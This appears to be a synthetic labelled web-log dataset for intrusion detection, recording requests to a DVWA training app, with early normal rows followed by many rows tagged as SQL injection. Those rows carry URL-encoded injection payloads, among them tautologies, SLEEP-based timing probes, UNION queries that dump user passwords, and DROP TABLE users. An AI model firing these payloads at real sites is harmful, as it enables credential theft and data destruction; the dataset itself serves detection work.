timestamp,ip,method,url,status,size,user_agent,label,attack_type
2026-07-04T18:05:39.575428,192.168.1.139,GET,/dvwa/login.php,200,4355,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36,Normal,None
2026-07-04T18:05:57.575428,192.168.1.110,GET,/dvwa/vulnerabilities/view_source.php,200,1486,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36,Normal,None
2026-07-04T18:06:39.575428,192.168.1.128,GET,/dvwa/js/dvwaPage.js,200,1463,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0,Normal,None
2026-07-04T18:08:06.575428,192.168.1.123,GET,/dvwa/instructions.php,200,1853,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,Normal,None
2026-07-04T18:09:07.575428,192.168.1.126,GET,/dvwa/vulnerabilities/view_source.php,200,2996,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36,Normal,None
2026-07-04T18:09:48.575428,192.168.1.132,GET,/dvwa/security.php,200,3250,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/121.0 Safari/537.36,Normal,None
2026-07-04T18:10:46.575428,192.168.1.123,GET,/dvwa/instructions.php,304,3654,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/121.0 Safari/537.36,Normal,None
2026-07-04T18:11:20.575428,192.168.1.108,GET,/dvwa/vulnerabilities/xss_r/?name=Priya,200,4428,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0,Normal,None
2026-07-04T18:12:11.575428,192.168.1.101,GET,/dvwa/instructions.php,200,4438,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0,Normal,None
2026-07-04T18:12:24.575428,192.168.1.105,GET,/dvwa/vulnerabilities/sqli/?id=5&Submit=Submit,200,3755,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,Normal,None
2026-07-04T18:12:36.575428,192.168.1.125,GET,/dvwa/css/main.css,302,1436,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36,Normal,None
2026-07-04T18:13:54.575428,192.168.1.103,GET,/dvwa/vulnerabilities/xss_r/?name=Priya,302,2693,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,Normal,None
2026-07-04T18:14:39.575428,192.168.1.122,GET,/dvwa/about.php,304,1403,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36,Normal,None
2026-07-04T18:15:35.575428,192.168.1.128,GET,/dvwa/login.php,304,3822,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/121.0 Safari/537.36,Normal,None
2026-07-04T18:16:24.575428,192.168.1.125,GET,/dvwa/about.php,200,502,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/121.0 Safari/537.36,Normal,None
2026-07-04T18:17:37.575428,192.168.1.121,GET,/dvwa/js/dvwaPage.js,302,1232,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0,Normal,None
2026-07-04T18:18:48.575428,192.168.1.134,GET,/dvwa/vulnerabilities/view_source.php,200,4391,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,Normal,None
2026-07-04T18:20:03.575428,192.168.1.119,GET,/dvwa/css/main.css,200,391,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,Normal,None
2026-07-04T18:20:11.575428,192.168.1.134,GET,/dvwa/vulnerabilities/view_source.php,200,3663,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,Normal,None
2026-07-04T18:21:20.575428,192.168.1.107,GET,/dvwa/vulnerabilities/sqli/?id=3&Submit=Submit,302,4357,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36,Normal,None
2026-07-04T18:22:10.575428,192.168.1.107,GET,/dvwa/css/main.css,200,3876,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36,Normal,None
2026-07-04T18:22:15.575428,192.168.1.150,GET,/dvwa/vulnerabilities/sqli/?id=%27%20OR%201%3D1%23&Submit=Submit,500,2532,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0,Attack,SQL Injection
2026-07-04T18:22:19.575428,192.168.1.161,GET,/dvwa/vulnerabilities/sqli/?id=1%27%20AND%20SLEEP%285%29--%20&Submit=Submit,200,2904,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36,Attack,SQL Injection
2026-07-04T18:22:22.575428,192.168.1.162,GET,/dvwa/vulnerabilities/sqli/?id=1%27%20OR%20%271%27%3D%271%27%20--%20&Submit=Submit,403,2265,curl/8.1.2,Attack,SQL Injection
2026-07-04T18:22:26.575428,192.168.1.161,GET,/dvwa/vulnerabilities/sqli/?id=1%27%20OR%20%271%27%3D%271%27%20--%20&Submit=Submit,500,1893,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0,Attack,SQL Injection
2026-07-04T18:22:33.575428,192.168.1.152,GET,/dvwa/vulnerabilities/sqli/?id=1%27%20OR%20%271%27%3D%271&Submit=Submit,200,682,Hydra/9.4,Attack,SQL Injection
2026-07-04T18:22:41.575428,192.168.1.156,GET,/dvwa/vulnerabilities/sqli/?id=1%27%20OR%20%271%27%3D%271%27%20--%20&Submit=Submit,403,2922,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0,Attack,SQL Injection
2026-07-04T18:22:48.575428,172.16.5.9,GET,/dvwa/vulnerabilities/sqli/?id=1%27%20AND%20SLEEP%285%29--%20&Submit=Submit,200,2193,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,Attack,SQL Injection
2026-07-04T18:22:55.575428,192.168.1.164,GET,/dvwa/vulnerabilities/sqli/?id=1%27%3B%20DROP%20TABLE%20users--%20&Submit=Submit,500,741,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0,Attack,SQL Injection
2026-07-04T18:22:58.575428,10.0.0.13,GET,/dvwa/vulnerabilities/sqli/?id=1%20UNION%20SELECT%20null%2Cnull--%20&Submit=Submit,200,2317,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0,Attack,SQL Injection
2026-07-04T18:23:00.575428,192.168.1.156,GET,/dvwa/vulnerabilities/sqli/?id=1%27%20UNION%20SELECT%20database%28%29%2Cversion%28%29--%20&Submit=Submit,200,792,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0,Attack,SQL Injection
2026-07-04T18:23:06.575428,192.168.1.153,GET,/dvwa/vulnerabilities/sqli/?id=1%27%20OR%20%271%27%3D%271%27%20--%20&Submit=Submit,200,1663,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,Attack,SQL Injection
2026-07-04T18:23:11.575428,192.168.1.151,GET,/dvwa/vulnerabilities/sqli/?id=1%27%20OR%20%271%27%3D%271%27%20--%20&Submit=Submit,403,1398,python-requests/2.31.0,Attack,SQL Injection
2026-07-04T18:23:17.575428,192.168.1.159,GET,/dvwa/vulnerabilities/sqli/?id=1%27%20UNION%20SELECT%20database%28%29%2Cversion%28%29--%20&Submit=Submit,200,735,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36,Attack,SQL Injection
2026-07-04T18:23:20.575428,192.168.1.163,GET,/dvwa/vulnerabilities/sqli/?id=1%27%20AND%20SLEEP%285%29--%20&Submit=Submit,403,1033,sqlmap/1.7.2#stable (http://sqlmap.org),Attack,SQL Injection
2026-07-04T18:23:23.575428,10.0.0.13,GET,/dvwa/vulnerabilities/sqli/?id=1%27%20OR%20%271%27%3D%271%27%20--%20&Submit=Submit,200,1578,sqlmap/1.7.2#stable (http://sqlmap.org),Attack,SQL Injection
2026-07-04T18:23:25.575428,192.168.1.151,GET,/dvwa/vulnerabilities/sqli/?id=1%27%20UNION%20SELECT%20database%28%29%2Cversion%28%29--%20&Submit=Submit,200,1418,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,Attack,SQL Injection
2026-07-04T18:23:33.575428,192.168.1.160,GET,/dvwa/vulnerabilities/sqli/?id=1%27%20UNION%20SELECT%20database%28%29%2Cversion%28%29--%20&Submit=Submit,200,693,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,Attack,SQL Injection
2026-07-04T18:23:36.575428,10.0.0.44,GET,/dvwa/vulnerabilities/sqli/?id=1%27%20UNION%20SELECT%20database%28%29%2Cversion%28%29--%20&Submit=Submit,200,760,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0,Attack,SQL Injection
2026-07-04T18:23:42.575428,192.168.1.152,GET,/dvwa/vulnerabilities/sqli/?id=1%27%3B%20DROP%20TABLE%20users--%20&Submit=Submit,500,1769,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,Attack,SQL Injection
2026-07-04T18:23:48.575428,172.16.5.9,GET,/dvwa/vulnerabilities/sqli/?id=1%27%20UNION%20SELECT%20database%28%29%2Cversion%28%29--%20&Submit=Submit,403,2795,sqlmap/1.7.2#stable (http://sqlmap.org),Attack,SQL Injection
2026-07-04T18:23:50.575428,192.168.1.155,GET,/dvwa/vulnerabilities/sqli/?id=1%27%20AND%20SLEEP%285%29--%20&Submit=Submit,200,2792,sqlmap/1.7.2#stable (http://sqlmap.org),Attack,SQL Injection
2026-07-04T18:23:52.575428,172.16.5.9,GET,/dvwa/vulnerabilities/sqli/?id=1%27%20UNION%20SELECT%20user%2Cpassword%20FROM%20users--%20&Submit=Submit,200,2369,Hydra/9.4,Attack,SQL Injection
2026-07-04T18:23:53.575428,10.0.0.44,GET,/dvwa/vulnerabilities/sqli/?id=1%27%20UNION%20SELECT%20database%28%29%2Cversion%28%29--%20&Submit=Submit,200,226,curl/8.1.2,Attack,SQL Injection
2026-07-04T18:23:55.575428,172.16.5.9,GET,/dvwa/vulnerabilities/sqli/?id=1%27%20OR%20%271%27%3D%271&Submit=Submit,403,992,python-requests/2.31.0,Attack,SQL Injection
2026-07-04T18:23:59.575428,192.168.1.164,GET,/dvwa/vulnerabilities/sqli/?id=%27%20OR%201%3D1%23&Submit=Submit,200,2562,Hydra/9.4,Attack,SQL Injection
2026-07-04T18:24:00.575428,10.0.0.13,GET,/dvwa/vulnerabilities/sqli/?id=%27%20OR%201%3D1%23&Submit=Submit,200,889,sqlmap/1.7.2#stable (http://sqlmap.org),Attack,SQL Injection
2026-07-04T18:24:07.575428,192.168.1.150,GET,/dvwa/vulnerabilities/sqli/?id=1%27%3B%20DROP%20TABLE%20users--%20&Submit=Submit,403,522,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/121.0 Safari/537.36,Attack,SQL Injection
2026-07-04T18:24:09.575428,192.168.1.153,GET,/dvwa/vulnerabilities/sqli/?id=1%27%20AND%20SLEEP%285%29--%20&Submit=Submit,500,898,python-requests/2.31.0,Attack,SQL Injection
2026-07-04T18:24:14.575428,192.168.1.152,GET,/dvwa/vulnerabilities/sqli/?id=1%27%20AND%20SLEEP%285%29--%20&Submit=Submit,200,2929,python-requests/2.31.0,Attack,SQL Injection
2026-07-04T18:24:17.575428,192.168.1.151,GET,/dvwa/vulnerabilities/sqli/?id=1%20UNION%20SELECT%20null%2Cnull--%20&Submit=Submit,200,389,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/121.0 Safari/537.36,Attack,SQL Injection
2026-07-04T18:24:22.575428,192.168.1.162,GET,/dvwa/vulnerabilities/sqli/?id=%27%20OR%201%3D1%23&Submit=Submit,500,1840,Hydra/9.4,Attack,SQL Injection
2026-07-04T18:24:28.575428,192.168.1.158,GET,/dvwa/vulnerabilities/sqli/?id=1%27%20OR%20%271%27%3D%271%27%20--%20&Submit=Submit,200,979,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,Attack,SQL Injection
2026-07-04T18:24:32.575428,192.168.1.157,GET,/dvwa/vulnerabilities/sqli/?id=1%27%3B%20DROP%20TABLE%20users--%20&Submit=Submit,200,1253,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0,Attack,SQL Injection
2026-07-04T18:24:33.575428,192.168.1.160,GET,/dvwa/vulnerabilities/sqli/?id=1%27%3B%20DROP%20TABLE%20users--%20&Submit=Submit,200,2133,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0,Attack,SQL Injection
2026-07-04T18:24:34.575428,192.168.1.163,GET,/dvwa/vulnerabilities/sqli/?id=1%27%20OR%20%271%27%3D%271&Submit=Submit,403,2419,curl/8.1.2,Attack,SQL Injection
2026-07-04T18:24:36.575428,192.168.1.157,GET,/dvwa/vulnerabilities/sqli/?id=1%27%20AND%20SLEEP%285%29--%20&Submit=Submit,200,1816,python-requests/2.31.0,Attack,SQL Injection
2026-07-04T18:24:44.575428,192.168.1.152,GET,/dvwa/vulnerabilities/sqli/?id=1%20UNION%20SELECT%20null%2Cnull--%20&Submit=Submit,403,2363,curl/8.1.2,Attack,SQL Injection
2026-07-04T18:24:47.575428,192.168.1.157,GET,/dvwa/vulnerabilities/sqli/?id=1%27%20UNION%20SELECT%20database%28%29%2Cversion%28%29--%20&Submit=Submit,200,154,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,Attack,SQL Injection
2026-07-04T18:24:55.575428,192.168.1.159,GET,/dvwa/vulnerabilities/sqli/?id=1%27%20OR%20%271%27%3D%271&Submit=Submit,200,2125,python-requests/2.31.0,Attack,SQL Injection
2026-07-04T18:25:00.575428,192.168.1.158,GET,/dvwa/vulnerabilities/sqli/?id=%27%20OR%201%3D1%23&Submit=Submit,500,2546,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,Attack,SQL Injection
2026-07-04T18:25:05.575428,192.168.1.151,GET,/dvwa/vulnerabilities/sqli/?id=1%27%20OR%20%271%27%3D%271%27%20--%20&Submit=Submit,403,517,python-requests/2.31.0,Attack,SQL Injection
2026-07-04T18:25:12.575428,192.168.1.153,GET,/dvwa/vulnerabilities/sqli/?id=1%27%20AND%20SLEEP%285%29--%20&Submit=Submit,200,1013,python-requests/2.31.0,Attack,SQL Injection
2026-07-04T18:25:18.575428,192.168.1.160,GET,/dvwa/vulnerabilities/sqli/?id=1%27%20UNION%20SELECT%20database%28%29%2Cversion%28%29--%20&Submit=Submit,403,1157,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36,Attack,SQL Injection
2026-07-04T18:25:24.575428,192.168.1.160,GET,/dvwa/vulnerabilities/sqli/?id=1%27%20UNION%20SELECT%20database%28%29%2Cversion%28%29--%20&Submit=Submit,200,1495,curl/8.1.2,Attack,SQL Injection
2026-07-04T18:25:25.575428,192.168.1.154,GET,/dvwa/vulnerabilities/sqli/?id=1%27%20UNION%20SELECT%20database%28%29%2Cversion%28%29--%20&Submit=Submit,200,189,sqlmap/1.7.2#stable (http://sqlmap.org),Attack,SQL Injection
2026-07-04T18:25:28.575428,192.168.1.163,GET,/dvwa/vulnerabilities/sqli/?id=1%27%3B%20DROP%20TABLE%20users--%20&Submit=Submit,200,482,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0,Attack,SQL Injection
2026-07-04T18:25:30.575428,172.16.5.9,GET,/dvwa/vulnerabilities/sqli/?id=1%27%20UNION%20SELECT%20database%28%29%2Cversion%28%29--%20&Submit=Submit,200,1595,sqlmap/1.7.2#stable (http://sqlmap.org),Attack,SQL Injection
2026-07-04T18:25:37.575428,192.168.1.161,GET,/dvwa/vulnerabilities/sqli/?id=1%20UNION%20SELECT%20null%2Cnull--%20&Submit=Submit,200,661,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,Attack,SQL Injection
2026-07-04T18:25:45.575428,192.168.1.161,GET,/dvwa/vulnerabilities/sqli/?id=1%27%20UNION%20SELECT%20database%28%29%2Cversion%28%29--%20&Submit=Submit,200,1057,curl/8.1.2,Attack,SQL Injection
2026-07-04T18:25:46.575428,192.168.1.158,GET,/dvwa/vulnerabilities/sqli/?id=1%27%20UNION%20SELECT%20user%2Cpassword%20FROM%20users--%20&Submit=Submit,200,2662,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/121.0 Safari/537.36,Attack,SQL Injection
2026-07-04T18:25:51.575428,192.168.1.157,GET,/dvwa/vulnerabilities/sqli/?id=1%27%20UNION%20SELECT%20database%28%29%2Cversion%28%29--%20&Submit=Submit,403,300,curl/8.1.2,Attack,SQL Injection
2026-07-04T18:25:56.575428,10.0.0.13,GET,/dvwa/vulnerabilities/sqli/?id=1%27%20OR%20%271%27%3D%271&Submit=Submit,500,2765,curl/8.1.2,Attack,SQL Injection
2026-07-04T18:26:03.575428,192.168.1.153,GET,/dvwa/vulnerabilities/sqli/?id=1%27%20UNION%20SELECT%20database%28%29%2Cversion%28%29--%20&Submit=Submit,500,2410,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36,Attack,SQL Injection
2026-07-04T18:26:07.575428,192.168.1.155,GET,/dvwa/vulnerabilities/sqli/?id=1%20UNION%20SELECT%20null%2Cnull--%20&Submit=Submit,200,671,Hydra/9.4,Attack,SQL Injection
2026-07-04T18:26:12.575428,192.168.1.157,GET,/dvwa/vulnerabilities/sqli/?id=1%27%20UNION%20SELECT%20user%2Cpassword%20FROM%20users--%20&Submit=Submit,200,2988,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36,Attack,SQL Injection
2026-07-04T18:26:17.575428,172.16.5.9,GET,/dvwa/vulnerabilities/sqli/?id=1%27%20OR%20%271%27%3D%271&Submit=Submit,200,2775,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0,Attack,SQL Injection
2026-07-04T18:26:18.575428,192.168.1.160,GET,/dvwa/vulnerabilities/sqli/?id=1%27%3B%20DROP%20TABLE%20users--%20&Submit=Submit,403,648,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,Attack,SQL Injection
2026-07-04T18:26:26.575428,10.0.0.13,GET,/dvwa/vulnerabilities/sqli/?id=1%27%20OR%20%271%27%3D%271&Submit=Submit,500,342,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/121.0 Safari/537.36,Attack,SQL Injection
2026-07-04T18:26:31.575428,192.168.1.163,GET,/dvwa/vulnerabilities/sqli/?id=%27%20OR%201%3D1%23&Submit=Submit,200,1755,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0,Attack,SQL Injection
2026-07-04T18:26:35.575428,192.168.1.160,GET,/dvwa/vulnerabilities/sqli/?id=1%27%20OR%20%271%27%3D%271&Submit=Submit,500,2974,Hydra/9.4,Attack,SQL Injection
2026-07-04T18:26:42.575428,192.168.1.152,GET,/dvwa/vulnerabilities/sqli/?id=1%27%20UNION%20SELECT%20user%2Cpassword%20FROM%20users--%20&Submit=Submit,500,1498,curl/8.1.2,Attack,SQL Injection
2026-07-04T18:26:47.575428,192.168.1.152,GET,/dvwa/vulnerabilities/sqli/?id=1%27%20OR%20%271%27%3D%271&Submit=Submit,200,1919,Hydra/9.4,Attack,SQL Injection
2026-07-04T18:26:48.575428,192.168.1.160,GET,/dvwa/vulnerabilities/sqli/?id=1%27%20UNION%20SELECT%20user%2Cpassword%20FROM%20users--%20&Submit=Submit,200,2089,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36,Attack,SQL Injection
2026-07-04T18:26:52.575428,192.168.1.160,GET,/dvwa/vulnerabilities/sqli/?id=%27%20OR%201%3D1%23&Submit=Submit,200,1119,sqlmap/1.7.2#stable (http://sqlmap.org),Attack,SQL Injection
2026-07-04T18:26:54.575428,192.168.1.164,GET,/dvwa/vulnerabilities/sqli/?id=1%27%20UNION%20SELECT%20database%28%29%2Cversion%28%29--%20&Submit=Submit,200,661,Hydra/9.4,Attack,SQL Injection
2026-07-04T18:26:56.575428,192.168.1.151,GET,/dvwa/vulnerabilities/sqli/?id=1%27%3B%20DROP%20TABLE%20users--%20&Submit=Submit,403,2990,sqlmap/1.7.2#stable (http://sqlmap.org),Attack,SQL Injection
2026-07-04T18:26:58.575428,192.168.1.154,GET,/dvwa/vulnerabilities/sqli/?id=1%27%20UNION%20SELECT%20database%28%29%2Cversion%28%29--%20&Submit=Submit,200,1384,sqlmap/1.7.2#stable (http://sqlmap.org),Attack,SQL Injection
2026-07-04T18:27:05.575428,192.168.1.152,GET,/dvwa/vulnerabilities/sqli/?id=1%27%20OR%20%271%27%3D%271&Submit=Submit,200,363,Hydra/9.4,Attack,SQL Injection
2026-07-04T18:27:10.575428,192.168.1.162,GET,/dvwa/vulnerabilities/sqli/?id=1%27%20OR%20%271%27%3D%271%27%20--%20&Submit=Submit,200,1833,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,Attack,SQL Injection
2026-07-04T18:27:14.575428,192.168.1.150,GET,/dvwa/vulnerabilities/sqli/?id=1%27%3B%20DROP%20TABLE%20users--%20&Submit=Submit,200,1903,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0,Attack,SQL Injection
2026-07-04T18:27:16.575428,192.168.1.160,GET,/dvwa/vulnerabilities/sqli/?id=1%27%20UNION%20SELECT%20database%28%29%2Cversion%28%29--%20&Submit=Submit,200,1494,sqlmap/1.7.2#stable (http://sqlmap.org),Attack,SQL Injection
2026-07-04T18:27:20.575428,192.168.1.153,GET,/dvwa/vulnerabilities/sqli/?id=1%27%20OR%20%271%27%3D%271&Submit=Submit,200,426,Hydra/9.4,Attack,SQL Injection
2026-07-04T18:27:24.575428,192.168.1.154,GET,/dvwa/vulnerabilities/sqli/?id=%27%20OR%201%3D1%23&Submit=Submit,200,2121,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36,Attack,SQL Injection
2026-07-04T18:27:32.575428,192.168.1.155,GET,/dvwa/vulnerabilities/sqli/?id=1%20UNION%20SELECT%20null%2Cnull--%20&Submit=Submit,200,397,curl/8.1.2,Attack,SQL Injection
2026-07-04T18:27:35.575428,192.168.1.159,GET,/dvwa/vulnerabilities/sqli/?id=%27%20OR%201%3D1%23&Submit=Submit,403,2540,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,Attack,SQL Injection
2026-07-04T18:27:38.575428,192.168.1.154,GET,/dvwa/vulnerabilities/sqli/?id=1%27%20AND%20SLEEP%285%29--%20&Submit=Submit,200,1554,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0,Attack,SQL Injection
2026-07-04T18:27:43.575428,192.168.1.161,GET,/dvwa/vulnerabilities/sqli/?id=1%20UNION%20SELECT%20null%2Cnull--%20&Submit=Submit,200,1122,sqlmap/1.7.2#stable (http://sqlmap.org),Attack,SQL Injection
2026-07-04T18:27:44.575428,192.168.1.163,GET,/dvwa/vulnerabilities/sqli/?id=1%27%20UNION%20SELECT%20user%2Cpassword%20FROM%20users--%20&Submit=Submit,500,2773,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/121.0 Safari/537.36,Attack,SQL Injection
2026-07-04T18:27:48.575428,192.168.1.152,GET,/dvwa/vulnerabilities/sqli/?id=1%27%20UNION%20SELECT%20user%2Cpassword%20FROM%20users--%20&Submit=Submit,200,2995,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/121.0 Safari/537.36,Attack,SQL Injection
2026-07-04T18:27:56.575428,192.168.1.160,GET,/dvwa/vulnerabilities/sqli/?id=1%27%20AND%20SLEEP%285%29--%20&Submit=Submit,200,1496,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/121.0 Safari/537.36,Attack,SQL Injection
2026-07-04T18:27:59.575428,192.168.1.153,GET,/dvwa/vulnerabilities/sqli/?id=1%27%20OR%20%271%27%3D%271&Submit=Submit,200,1048,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0,Attack,SQL Injection
2026-07-04T18:28:00.575428,192.168.1.157,GET,/dvwa/vulnerabilities/sqli/?id=1%27%20UNION%20SELECT%20database%28%29%2Cversion%28%29--%20&Submit=Submit,200,1023,curl/8.1.2,Attack,SQL Injection
2026-07-04T18:28:04.575428,10.0.0.13,GET,/dvwa/vulnerabilities/sqli/?id=1%27%3B%20DROP%20TABLE%20users--%20&Submit=Submit,500,1789,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/121.0 Safari/537.36,Attack,SQL Injection
2026-07-04T18:28:07.575428,192.168.1.150,GET,/dvwa/vulnerabilities/sqli/?id=1%27%20OR%20%271%27%3D%271&Submit=Submit,200,1615,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/121.0 Safari/537.36,Attack,SQL Injection
2026-07-04T18:28:08.575428,172.16.5.9,GET,/dvwa/vulnerabilities/sqli/?id=1%20UNION%20SELECT%20null%2Cnull--%20&Submit=Submit,403,1953,Hydra/9.4,Attack,SQL Injection
2026-07-04T18:28:12.575428,192.168.1.161,GET,/dvwa/vulnerabilities/sqli/?id=1%27%20OR%20%271%27%3D%271&Submit=Submit,500,960,sqlmap/1.7.2#stable (http://sqlmap.org),Attack,SQL Injection
2026-07-04T18:28:17.575428,192.168.1.155,GET,/dvwa/vulnerabilities/sqli/?id=1%27%20AND%20SLEEP%285%29--%20&Submit=Submit,500,1541,curl/8.1.2,Attack,SQL Injection
2026-07-04T18:28:21.575428,192.168.1.155,GET,/dvwa/vulnerabilities/sqli/?id=1%27%20OR%20%271%27%3D%271&Submit=Submit,500,1222,curl/8.1.2,Attack,SQL Injection
2026-07-04T18:28:23.575428,192.168.1.150,GET,/dvwa/vulnerabilities/sqli/?id=1%27%3B%20DROP%20TABLE%20users--%20&Submit=Submit,200,1536,python-requests/2.31.0,Attack,SQL Injection
